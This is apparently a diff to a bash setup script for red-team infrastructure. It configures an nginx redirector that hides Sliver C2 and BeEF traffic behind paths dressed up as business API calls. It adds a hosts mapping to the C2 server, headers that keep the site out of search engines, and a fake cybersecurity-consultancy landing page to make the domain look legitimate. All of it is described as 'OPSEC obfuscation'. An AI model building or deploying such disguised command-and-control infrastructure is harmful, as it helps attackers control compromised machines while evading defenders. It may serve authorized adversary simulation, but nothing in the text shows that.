@@ -206,15 +206,40 @@ fi
 
 # === Role-specific configuration (nginx for redirector) ===
 if [[ "$ROLE" == "redirector" ]]; then
-  echo "[*] Configuring nginx redirector site (adjust proxy_pass to C2 VPN IP)..."
+  echo "[*] Configuring nginx redirector site with OPSEC obfuscation..."
+  
+  # Create hosts entry for domain-based obfuscation
+  if ! grep -q "internal-api.knightsgambitsecurity.com" /etc/hosts; then
+    echo "10.44.0.10 internal-api.knightsgambitsecurity.com" >> /etc/hosts
+    echo "[*] Added internal DNS mapping for C2 server"
+  fi
+  
   cat > /etc/nginx/sites-available/redirector <<'NGINX_EOF'
 server {
     listen 80;
-    server_name _;
+    server_name knightsgambitsecurity.com www.knightsgambitsecurity.com;
+    
+    # Security headers
+    add_header X-Frame-Options DENY;
+    add_header X-Content-Type-Options nosniff;
+    add_header X-Robots-Tag "noindex, nofollow" always;
 
-    location /cdn {
-        # Replace with your C2 VPN IP:port (e.g., http://10.44.0.10:8888)
-        proxy_pass http://10.44.0.10:8888;
+    # Obfuscated C2 endpoints - appear as business API calls
+    location /api/v1/status {
+        # Sliver C2 endpoint
+        proxy_pass http://internal-api.knightsgambitsecurity.com:80/sliver;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        proxy_http_version 1.1;
+        proxy_set_header Connection "";
+        proxy_buffering off;
+    }
+    
+    location /resources/updates {
+        # BeEF endpoint  
+        proxy_pass http://internal-api.knightsgambitsecurity.com:3000/beef;
         proxy_set_header Host $host;
         proxy_set_header X-Real-IP $remote_addr;
         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
@@ -226,9 +251,61 @@ server {
     location / {
         root /var/www/html;
         index index.html;
+        try_files $uri $uri/ =404;
+    }
+    
+    # Block common security scanner paths
+    location ~ /\.(ht|git|env) {
+        deny all;
+        return 404;
     }
 }
 NGINX_EOF
+
+  # Create believable business website content
+  mkdir -p /var/www/html
+  cat > /var/www/html/index.html <<'HTML_EOF'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Knights Gambit Security - Cybersecurity Consulting</title>
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; background: #f4f4f4; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
+        h1 { color: #333; border-bottom: 3px solid #007acc; }
+        .services { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; }
+        .service { background: #f9f9f9; padding: 15px; border-left: 4px solid #007acc; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Knights Gambit Security</h1>
+        <p>Professional cybersecurity consulting and penetration testing services.</p>
+        
+        <div class="services">
+            <div class="service">
+                <h3>Penetration Testing</h3>
+                <p>Comprehensive security assessments to identify vulnerabilities.</p>
+            </div>
+            <div class="service">
+                <h3>Security Consulting</h3>
+                <p>Expert guidance on cybersecurity strategy and implementation.</p>
+            </div>
+            <div class="service">
+                <h3>Compliance Auditing</h3>
+                <p>Ensuring your organization meets regulatory requirements.</p>
+            </div>
+        </div>
+        
+        <hr>
+        <p><strong>Contact:</strong> info@knightsgambitsecurity.com</p>
+        <p><small>© 2024 Knights Gambit Security LLC. All rights reserved.</small></p>
+    </div>
+</body>
+</html>
+HTML_EOF
 
   ln -sf /etc/nginx/sites-available/redirector /etc/nginx/sites-enabled/
   # remove default site to avoid conflicts
@@ -237,7 +314,8 @@ NGINX_EOF
   # test and restart nginx
   if nginx -t; then
     systemctl restart nginx
-    echo "[*] Nginx restarted successfully"
+    echo "[*] Nginx restarted successfully with obfuscated configuration"
+    echo "[*] C2 endpoints: /api/v1/status (Sliver), /resources/updates (BeEF)"
   else
     echo "[!] Nginx configuration test failed - check logs with 'nginx -t'"
   fi
